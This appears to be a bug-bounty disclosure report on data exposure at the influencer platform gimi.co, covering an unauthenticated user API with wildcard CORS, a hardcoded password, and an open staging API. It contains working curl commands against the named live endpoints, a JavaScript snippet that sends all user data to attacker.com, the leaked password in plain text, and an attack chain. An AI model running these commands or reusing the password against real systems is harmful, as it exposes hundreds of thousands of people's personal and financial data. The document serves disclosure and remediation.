# GIMI Data Leak — 234,975 User Profiles Exposed

> **Target:** gimi.co — Creator/Influencer Marketing Platform
> **Date Discovered:** 2026-06-08
> **Researcher:** [Gibran](mailto:baksoaok@gmail.com)

---

## TL;DR

**234,975 user profiles** — including financial data, auth tokens, and payment methods — exposed via a public API endpoint with zero authentication and wildcard CORS. Plus: $5.19M in campaign budgets, a staging API with $2.49B in test data, and a hardcoded password in client-side HTML.

---

## Architecture Overview

```
www.gimi.co → Webflow (3 static pages)
app.gimi.co → CloudFront → Next.js + Clerk Auth (pk_live_...)
dev.gimi.co → CloudFront → SAME Next.js + SAME Clerk LIVE key

sdk-api.gimi.co → ALB (prod-gimi-sdk-alb) → Express API (WILDCARD CORS)
       ├── /users           → 234,975 users (NO AUTH)
       ├── /users/{id}      → Full profile (NO AUTH)
       └── /health

prod-bb-backend.thequestofevolution.com → Express API
       ├── /api/sparks      → 228 campaigns, $5.19M (NO AUTH)
       └── /users           → paginated

staging-bb-backend.thequestofevolution.com → Express API
       ├── /api/sparks      → 365 campaigns, $2.49B (NO AUTH)
       └── /api-docs/       → Swagger UI (Blockbook API v1.0.0)
```

---

## Finding 1: User Data Leak (Critical)

**Endpoint:** `GET https://sdk-api.gimi.co/users?limit=1000000`

234,975 user profiles returned with **no authentication required**. The Clerk auth middleware returns `signed-out` status — but the endpoint serves data anyway.

### Exposed per User
| Field | Example |
|-------|---------|
| Full name, username, clerkUserId | `Lumina Nabal`, `user_3ErIoPn0...` |
| Balance, ip_points, paid_credits | Financial data |
| TikTok/Reddit auth | `tokenType: "Bearer"` |
| Payment method | `Revolut`, `USD` |
| Device fingerprint | `sha256$...` |
| Company role, industry | |
| Withdrawal restrictions | `isBlocked: false` |
| Trust score, level history | |
| Marketing consent | |
| Ban/evasion status | `possiblyBanEvader`, `banned` |

### Wildcard CORS Amplification

```
Access-Control-Allow-Origin: *
```

Any website can silently exfiltrate all 234K profiles from a visitor's browser:

```javascript
fetch('https://sdk-api.gimi.co/users?limit=1000000')
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/steal', {method: 'POST', body: JSON.stringify(data)}));
```

### PoC
```bash
# List all users
curl -s "https://sdk-api.gimi.co/users?limit=1000000" | head -c 500

# Get full user detail
curl -s "https://sdk-api.gimi.co/users/6a26d787d9bc4fd959edd773"
```

---

## Finding 2: Hardcoded Password in RSC Payload (High)

**Target:** `app.gimi.co` + `dev.gimi.co`

A password `Hv08GYnI+xUh1YLi` is embedded in the RSC (React Server Components) payload visible in the HTML source. Same credential used on both production and staging environments.

### PoC
```bash
curl -sL https://app.gimi.co | grep -oP '"password":"[^"]*"'
# Returns: "password":"Hv08GYnI+xUh1YLi"
```

---

## Finding 3: Staging API + Swagger UI Exposed (Medium)

**Target:** `staging-bb-backend.thequestofevolution.com`

- Full API documentation via public Swagger UI at `/api-docs/`
- Internal server URL leaked: `http://localhost:9000`
- 365 campaigns exposed with test data including $1.39B single campaign
- **No authentication** on any endpoint

---

## Finding 4: Dev Environment Uses Production Clerk Key (Low)

`dev.gimi.co` loads `pk_live_Y2xlcmsuYXBwLmdpbWkuY28k` — the production Clerk publishable key — instead of a staging/test key. Testing in dev directly affects production authentication state.

---

## Attack Chain

```
Step 1: Victim visits attacker's website
Step 2: Attacker's site fetches https://sdk-api.gimi.co/users?limit=1000000
         (wildcard CORS allows cross-origin requests from any domain)
Step 3: 234,975 user profiles harvested — names, balance, auth tokens
Step 4: User IDs used to query /users/{id} for full detail
Step 5: Financial data, payment methods, device fingerprints exfiltrated
```

---

## Remediation

| Priority | Fix |
|----------|-----|
| IMMEDIATE | Add authentication middleware to `/users` and `/users/:id` |
| IMMEDIATE | Remove wildcard CORS — set explicit allowed origins |
| IMMEDIATE | Rotate hardcoded password `Hv08GYnI+xUh1YLi` |
| IMMEDIATE | Add auth to staging API + protect Swagger UI |
| THIS WEEK | Separate staging Clerk project with test keys |

---

## Disclosure Timeline

| Date | Event |
|------|-------|
| 2026-06-08 | Recon & discovery |
| 2026-06-08 | Data verification — 234,975 users confirmed |
| 2026-06-08 | Report & disclosure email prepared |

---

## Files

- `~/bug-bounty/gimi.co/report-gimi-co.md` — Full pentest report
- `~/bug-bounty/gimi.co/users_100.json` — 100 sample records

---

*Disclosed responsibly. No data was modified or deleted.*
